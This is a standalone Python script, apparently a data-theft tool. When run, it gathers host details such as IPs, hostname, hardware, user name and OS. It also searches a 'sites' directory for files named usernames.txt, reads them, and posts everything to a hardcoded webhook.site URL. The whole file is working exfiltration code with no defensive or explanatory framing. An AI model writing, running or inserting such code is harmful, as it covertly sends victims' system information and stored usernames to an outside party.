import socket, requests, platform, psutil, getpass, os

os.system('pip install psutil')
def convert_bytes_to_gb(bytes_value):
    gb_value = bytes_value / (1024 ** 3)
    return round(gb_value, 2)

def send_webhook(machine_info):
    url = "https://webhook.site/fb215113-49f3-4406-8fbb-29d3e2db6439"  # Replace with your webhook URL

    response = requests.post(url, json=machine_info)
    if response.status_code == 200:
        print("Webhook sent successfully!")
    else:
        print("Failed to send webhook.")

def find_usernames_files(directory):
    usernames_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file == "usernames.txt":
                usernames_files.append(os.path.join(root, file))
    return usernames_files

def read_file_content(file_path):
    with open(file_path, "r") as file:
        return file.read()

def get_machine_info():
    local_ip = socket.gethostbyname(socket.gethostname())
    public_ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
    hostname = socket.gethostname()
    processor = platform.processor()
    architecture = platform.machine()
    memory = convert_bytes_to_gb(psutil.virtual_memory().total)
    disk = psutil.disk_usage('/')
    total_disk_space = convert_bytes_to_gb(disk.total)
    used_disk_space = convert_bytes_to_gb(disk.used)
    free_disk_space = convert_bytes_to_gb(disk.free)
    current_user = getpass.getuser()
    python_version = platform.python_version()
    os_info = platform.platform()
    current_directory = os.getcwd()  # Get current working directory
    sites_directory = os.path.join(current_directory, "sites")
    usernames_files = find_usernames_files(sites_directory)
    directory_structure = []

    for usernames_file in usernames_files:
        file_content = read_file_content(usernames_file)
        directory_structure.append({
            "path": os.path.dirname(usernames_file),
            "usernames_file": {
                "path": usernames_file,
                "content": file_content
            }
        })

    machine_info = {
        "local_ip": local_ip,
        "public_ip": public_ip,
        "hostname": hostname,
        "processor": processor,
        "architecture": architecture,
        "memory": memory,
        "total_disk_space": total_disk_space,
        "used_disk_space": used_disk_space,
        "free_disk_space": free_disk_space,
        "current_user": current_user,
        "python_version": python_version,
        "os_info": os_info,
        "directory_structure": directory_structure
        # Add more information as needed
    }

    return machine_info

machine_info = get_machine_info()
send_webhook(machine_info)
